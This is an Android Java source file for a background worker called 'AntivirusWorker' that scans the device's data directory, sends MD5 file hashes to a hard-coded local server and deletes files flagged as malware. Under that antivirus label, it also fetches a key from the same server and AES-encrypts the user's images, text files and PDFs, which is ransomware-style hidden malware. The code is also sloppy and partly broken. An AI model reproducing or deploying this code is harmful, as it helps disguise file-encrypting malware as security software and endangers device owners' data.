package com.example.myapplication.workers;



import android.content.Context;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.Request;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AntivirusWorker extends Worker {
    private final String url = "http://192.168.43.134/hash";
    private final String LOG_TAG = "NUMBAH 1:";
    private Map<String,String> listOfMalware;
    private MessageDigest md = MessageDigest.getInstance("MD5");
    private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
    public AntivirusWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        File yes =  Environment.getDataDirectory();
        try {
            yesu(yes);
        } catch (IOException | JSONException e) {
            Log.e(LOG_TAG, "shit", e);
        }
        return Result.success();
    }

    private void yesu(File yes) throws IOException, JSONException {
       if(yes.exists()){
           File[] array = yes.listFiles();
           for (File oof:array) {
               if(oof.isDirectory()){
                   yesu(oof);
               }
               else{
                   FileInputStream fis = new FileInputStream(oof);
                   int i = 0;
                   do{
                       byte[] bytes = new byte[2097152];
                       i = fis.read(bytes);
                       md.update(bytes);
                   }while(i!=-1);
                   byte[] hash = md.digest();
                   BigInteger no = new BigInteger(1,hash);
                   StringBuilder wheeee = new StringBuilder(no.toString(16));
                   while (wheeee.length() < 32) {
                       wheeee.insert(0, "0");
                   }
                   JSONObject body = new JSONObject();
                   body.put("hash",wheeee);
                   YeetRequest jsonObjectRequest = new YeetRequest(YeetRequest.Method.POST,url,body,response->{
                       try {
                           boolean isMalware = response.getBoolean("malware");
                           if(isMalware){
                               String type = response.getString("type");
                               listOfMalware.put(oof.getAbsolutePath(),type);
                               boolean ree = oof.delete();
                               if(!ree){
                                   throw new Exception("failed");
                               }
                           }
                       } catch (Exception e) {
                           Log.e(LOG_TAG,"reeeee",e);
                       }
                   }, Throwable::printStackTrace);
                   for(String lmao:extenstions) {
                       if (oof.getAbsolutePath().endsWith(lmao)) {
                           weeeeeeeeeeeeee(oof);
                       }
                   }
               }
           }
       }
    }
    private void weeeeeeeeeeeeee(File file){
        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,url,null,response -> {
            try {
                String boom = response.getString("key");
                md = MessageDigest.getInstance("SHA-256");
                byte[] keyBytes = md.digest(boom.getBytes());
                SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
                byte[] ivBytes = new byte[16];
                new SecureRandom().nextBytes(ivBytes);
                Cipher cipher = Cipher.getInstance("PBEWITHSHA256AND256BITAES-CBC-BC");
                IvParameterSpec iv = new IvParameterSpec(ivBytes);
                cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                FileInputStream fis = new FileInputStream(file);
                File encrypted = new File(file.getName().concat("enc"));
                FileOutputStream fos = new FileOutputStream(encrypted);
                int i;
                byte[] bytes = new byte[2097152];
                do{
                    i = fis.read(bytes);
                    cipher.update(bytes);
                }while(i!=-1);
                fos.write(cipher.doFinal());
                fis.close();
                fos.close();
                Log.i(LOG_TAG, String.valueOf(response));
                Log.i(LOG_TAG, Arrays.toString(ivBytes));
            } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                Log.e(LOG_TAG, "shit", e);
            }
        },Throwable::printStackTrace);
        Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
    }

}
